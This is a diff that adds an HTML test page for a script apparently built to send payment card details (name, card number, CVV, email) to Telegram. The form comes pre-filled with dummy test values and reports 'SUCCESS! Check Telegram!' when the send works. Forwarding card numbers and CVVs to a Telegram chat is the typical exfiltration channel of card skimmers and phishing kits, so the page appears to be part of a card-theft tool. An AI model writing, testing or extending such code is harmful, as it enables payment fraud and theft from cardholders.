@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Simple Telegram</title>
+</head>
+<body>
+    <h1>Test Direct Telegram Sending</h1>
+    
+    <form id="testForm">
+        <input type="text" id="cardName" placeholder="Card Name" value="Test User">
+        <input type="text" id="cardNumber" placeholder="Card Number" value="4111111111111111">
+        <input type="text" id="cvv" placeholder="CVV" value="123">
+        <input type="email" id="email" placeholder="Email" value="test@test.com">
+        <button type="submit">Test Send to Telegram</button>
+    </form>
+
+    <script src="simple-telegram.js"></script>
+    <script>
+        document.getElementById('testForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const testData = {
+                cardName: document.getElementById('cardName').value,
+                cardNumber: document.getElementById('cardNumber').value,
+                cvv: document.getElementById('cvv').value,
+                email: document.getElementById('email').value
+            };
+            
+            console.log('Testing with data:', testData);
+            
+            sendCardToTelegram(testData)
+                .then(result => {
+                    console.log('Result:', result);
+                    alert(result.success ? 'SUCCESS! Check Telegram!' : 'FAILED: ' + result.error);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('ERROR: ' + error.message);
+                });
+        });
+    </script>
+</body>
+</html> 
